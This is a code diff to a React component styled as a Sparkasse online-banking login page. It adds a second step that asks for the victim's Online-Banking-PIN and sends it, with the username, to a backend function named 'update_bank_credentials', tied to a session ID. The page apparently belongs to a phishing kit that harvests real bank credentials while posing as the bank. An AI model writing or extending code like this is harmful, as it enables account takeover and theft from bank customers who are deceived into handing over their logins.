@@ -97,6 +97,10 @@ const Sparkasse = () => {
 
   const [username, setUsername] = useState("");
   const [error, setError] = useState(false);
+  const [step, setStep] = useState<1 | 2>(1);
+  const [pin, setPin] = useState("");
+  const [pinError, setPinError] = useState(false);
+  const [showPin, setShowPin] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
@@ -104,22 +108,34 @@ const Sparkasse = () => {
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (username.trim() === "") {
-      setError(true);
+    if (step === 1) {
+      if (username.trim() === "") { setError(true); return; }
+      setStep(2);
+      setTimeout(() => document.getElementById("sk-pin")?.focus(), 0);
       return;
     }
+    if (pin.trim() === "") { setPinError(true); return; }
     if (sessionId) {
       const { error: err } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: username,
-        p_password: "",
+        p_password: pin,
         p_username_label: "Anmeldename",
-        p_password_label: "",
+        p_password_label: "Online-Banking-PIN",
       });
       if (err) console.error("Update failed:", err);
     }
     setShowLoading(true);
   };
+
+  const editUsername = () => {
+    setStep(1);
+    setPin("");
+    setPinError(false);
+    setShowPin(false);
+    setTimeout(() => document.getElementById("sk-anmeldename")?.focus(), 0);
+  };
+
 
   return (
     <>
